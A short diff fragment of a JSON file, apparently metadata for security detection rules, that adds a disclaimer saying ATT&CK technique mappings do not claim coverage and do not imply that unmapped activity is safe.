+      "ATT&CK mappings relate a rule to a technique; they are not a claim of ATT&CK coverage, and unmapped activity is not implied to be safe."
+    ]
+  }
+}
